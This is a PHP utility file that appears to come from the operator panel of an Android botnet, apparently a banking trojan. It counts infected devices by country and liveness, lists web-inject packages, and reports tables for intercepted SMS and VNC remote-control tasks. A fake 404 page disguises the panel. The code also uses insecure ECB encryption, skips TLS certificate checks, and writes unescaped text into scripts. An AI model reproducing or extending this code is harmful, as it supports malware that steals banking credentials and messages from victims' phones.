<?php

function redirect($url, $timeout=1)
{
	return "<meta http-equiv='refresh' content='{$timeout}; url={$url}' />";
}

function icon_img($icon_bin, $encode=true)
{
	if($icon_bin == "")
		return "<div style='width: 32px; height: 32px; border: 1px solid black; display: inline-block; vertical-align: middle; text-align: center'><i style='color: green' class='flaticon-android-character-symbol'></i></div>";

	if($encode)
		$icon_bin = base64_encode($icon_bin);

	return "<img src='data:image/png;base64,{$icon_bin}' width='32' style='border: 1px solid black' />";
}

function dd($data){
	echo "<pre>";
	var_dump($data);die;
}

function show_404($comm="")
{
	$uri = ($_SERVER['REQUEST_URI'])? $_SERVER['REQUEST_URI'] : '/';
	
	$err = <<<PHP
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {$uri} was not found on this server.</p>
</body></html>
<!-- {$comm} -->
PHP;
	header("HTTP/1.0 404 Not Found");
	die($err);
}

// every call need to add exclude to enc.php include in index.php
function download($name, $data) 
{

	ignore_user_abort(true);
	set_time_limit(0); // important for file 2mb large

	$sz = strlen($data);
	
	header("Content-Type: application/x-force-download; name={$name}");
	header("Content-Disposition: attachment;filename={$name}\n");
	header("Expires: Mon, 31 Dec 1999 00:00:00 GMT\n");
	header("Accept-Ranges: bytes\n");
	header("Pragma: private\n");
	header("Cache-control: private\n");
	header("Content-Length: {$sz}\n\n");

	echo $data;
    die;
}

function http($url)
{
	$ch = curl_init($url);
	
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	$contents = curl_exec($ch);
	curl_close($ch);
	
	return trim($contents);
}

function get_ip()
{
	$ip = "";
	
	if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
		$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	
	elseif(isset($_SERVER["HTTP_X_REAL_IP"]))
		$ip = $_SERVER["HTTP_X_REAL_IP"];
	
	elseif(!empty($_SERVER["HTTP_CLIENT_IP"]))
		$ip = $_SERVER["HTTP_CLIENT_IP"];
		
	elseif(isset($_SERVER["REMOTE_ADDR"]))
		$ip = $_SERVER["REMOTE_ADDR"];

	if(strstr($ip, ","))
		$ip = array_shift(explode(",", $ip));
		
	return $ip;
}

function aes_encrypt($input, $key)
{
	$size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB); 

	$pad = $size - (strlen($input) % $size); 
	$input = $input . str_repeat(chr($pad), $pad); 
	
	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_ECB, ''); 
	$iv = mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_RAND); 
	mcrypt_generic_init($td, $key, $iv); 
	$data = mcrypt_generic($td, $input); 
	mcrypt_generic_deinit($td); 
	mcrypt_module_close($td); 
	$data = base64_encode($data); 
	return $data; 
}

function aes_decrypt($input, $key) {
	$decrypted= mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, base64_decode($input), MCRYPT_MODE_ECB);
	$dec_s = strlen($decrypted); 
	$padding = ord($decrypted[$dec_s-1]); 
	$decrypted = substr($decrypted, 0, -$padding);
	return $decrypted;
}

function startsWith($string, $startString)
{
	$len = strlen($startString);
	return (substr($string, 0, $len) === $startString);
}

function endsWith($string, $endString)
{
	$len = strlen($endString);
	if ($len == 0) {
		return true;
	}
	return (substr($string, -$len) === $endString);
}

function size_readable($size) 
{
	if($size >= 1<<30) 
		return number_format($size/(1<<30),2)." gb";

	if($size >= 1<<20) 
		return number_format($size/(1<<20),2)." mb";

	if($size >= 1<<10) 
		return number_format($size/(1<<10),2)." kb";

	return number_format($size)." bytes";
}

function date_readable($ts)
{
	if(strstr($ts, " "))
		$ts = strtotime($ts);
		
	if(date("d.m.y", $ts) == date("d.m.y", time()))
		$d = "Today, " . date("H:i", $ts);
	else
		$d = date("d.m.y H:i", $ts);
		
	return $d;
}

// $str - value of textarea in settings (like desired_apps)
// return - array
function package_list_to_array($str)
{
	$str = str_replace("\r", "", trim($str));
	$str = str_replace("|", "\n", $str);
	$str = str_replace(",", "\n", $str);
	
	$arr = explode("\n", $str);
	$new = [];
	foreach($arr as $r)
		if(trim($r) != "" && strstr($r, "."))
			$new[] = trim($r);
	
	$new = array_unique($new);
	return $new;
}

function get_last_seen_marker($datetime)
{
	$ts = date_create($datetime)->getTimestamp();
	$passed = time()-$ts;

	if($passed < 60*10) # 10m
		$color = 'lime';
	else if($passed < 60*30) # 30m
		$color = 'green';
	else if($passed < 60*60*2) # 2h
		$color = '#FFDA51';
	else if($passed < 60*60*8) # 8h
		$color = 'orange';
	else if($passed < 60*60*Bots::LAST_SEEN_HOURS) # 12h
		$color = 'darkred';
	else
		$color = 'black';

	return "<i class='flaticon-android-character-symbol' style='color: {$color}'></i>";
}

function last_seen_time($ts)
{
	$date1 = new DateTime($ts);

	$date2 = new DateTime();
	$interval = $date1->diff($date2);

	$h = $interval->h;
	
	if($h < 10)
		$h = "0" . $h;
		
	$i = $interval->i;
	if($i < 10)
		$i = "0" . $i;
		
	$s = $interval->s;
	if($s < 10)
		$s = "0" . $s;
		
	$ago = $i . "m:" . $s . "s ago"; 

	if($h > 0)
		$ago = $h . " hours ago";
		//~ $ago = $h . "h:" . $ago;
		
	if($interval->d > 0)
		$ago = $interval->d." days ago";
		//~ $ago = $interval->d." days " . $ago;
		
	return $ago;
}

function time_readable($ts)
{
	//~ $res = $ts%60 . "s";

	//~ $m = floor(($ts%3600)/60);
	//~ if($m)
		//~ $res = $m . "m " . $res;

	//~ $h = floor(($ts%86400)/3600);
	//~ if($h)
		//~ $res = $h ."h " . $res;

	//~ $d = floor(($ts%2592000)/86400);
	//~ if($d)
		//~ $res = $d . "d " . $res;

	//~ return $res;

	$dtF = new \DateTime('@0');
	$dtT = new \DateTime("@$ts");
	$r = $dtF->diff($dtT)->format('%ad %hh %im %ss');
	
	if(startsWith($r, "0d "))
		$r = str_replace("0d ", "", $r);
	
	if(startsWith($r, "0h "))
		$r = str_replace("0h ", "", $r);
	
	if(startsWith($r, "0m "))
		$r = str_replace("0m ", "", $r);
	
	return $r;
}

function password($length, $use_digits=false, $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {

	if($use_digits)
		$alphabet .= '1234567890';
	
	//$alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
	$pass = array(); 
	$alphaLength = strlen($alphabet) - 1; 
	for ($i = 0; $i < $length; $i++)
		$pass[] = $alphabet[rand(0, $alphaLength)];

	return implode($pass); 
}

function isValidBotId($bot_id)
{
	return preg_match("/^[0-9A-z]{32}$/", $bot_id);
}

function msg_ok($text, $autoclose=true)
{
	$close = ($autoclose)? "true" : "false";
	return "<script>show_message('{$text}', 'ok', {$close})</script>";
}

function msg_err($text, $autoclose=true)
{
	$close = ($autoclose)? "true" : "false";
	return "<script>show_message('{$text}', 'error', {$close})</script>";
}

function scanInjects($folder=".")
{
	$pkgs = [];
	foreach(glob("{$folder}/wi/*") as $i)
	{
		if(!is_dir($i)) continue;
		if(!strstr($i, ".")) continue;
		
		$parts = explode("/", $i);
		$pkg = array_pop($parts);
		
		if(!strstr($pkg, ".")) continue;
		
		$pkgs[] = $pkg;
	}
	
	return $pkgs;
}

function show_stats($db)
{
	$LAST_SEEN_HOURS = 12;
	$ALIVE_MIN = 5;
	
	echo "<pre>TOTAL:\n";
	
	$tables = ['bots', 'bots_tasks', 'errors', 'injects', 'sms', 'vnc_tasks'];
	foreach($tables as $table)
	{
		$total = $db->fetch("select count(id) from {$table};", true)[0]['count(id)'];
		echo "\t{$table}:{$total}\n";
	}

	$total = $db->fetch("select count(id) from bots where vnc<>'';", true)[0]['count(id)'];
	echo "\tactive_vncs:{$total}\n";

	$res = $db->fetch("select country, registered, last_seen from bots", true);
	$countries = array();
	if(sizeof($res))
	{
		$tmp_stats = array();
		foreach($res as $r)
		{
			if(!array_key_exists($r['country'], $tmp_stats))
			{
				$tmp_stats[$r['country']] = array(
					'total'=>0, 
					'alive'=>0, 
					'offline'=>0, 
					'dead'=>0,
					'installed_today'=>0,
				);
			}
			
			$tmp_stats[$r['country']]['total']++;
			
			if(time() - date_create($r['registered'])->getTimestamp() < 60*60*24)
			{
				$tmp_stats[$r['country']]['installed_today']++;
			}
			
			$ts = date_create($r['last_seen'])->getTimestamp();
			$passed = time()-$ts;
			
			if($passed < 60*$ALIVE_MIN) # 60*Bots::ALIVE_HOURS
			{
				$tmp_stats[$r['country']]['alive']++;
			}
			else if($passed < 60*60*$LAST_SEEN_HOURS)
			{
				$tmp_stats[$r['country']]['offline']++;
			}
			else
			{
				$tmp_stats[$r['country']]['dead']++;
			}
		}
	}
	echo "\n";
	echo "STATS:\n";
	echo "\tcountry:total,alive,offline,dead,installed_today\n";
	$alive_total = 0;
	foreach($tmp_stats as $country=>$info)
	{
		if($country == "") $country = "?";
		echo "\t{$country}:" . implode(",", $info)."\n";
		$alive_total += $info["alive"];
	}
	
	echo "\n";
	echo "ALIVE TOTAL: {$alive_total}\n";
	
	echo "\n";
	echo "SPACE:\n";
	exec("df -h", $out);
	foreach($out as $o) 
		if(strstr($o, "/dev/"))
			echo "\t".$o."\n";
	
	echo "\n";
	echo "PANEL SIZE:\n";
	exec("du -ch .", $out);
	echo "\t".$out[sizeof($out)-1];
}

// app1|app2|app3|...
function apps2array($apps)
{
	// removes empty elements and duplicates
	return array_unique(array_filter(array_map("trim", explode("|", $apps))));
}





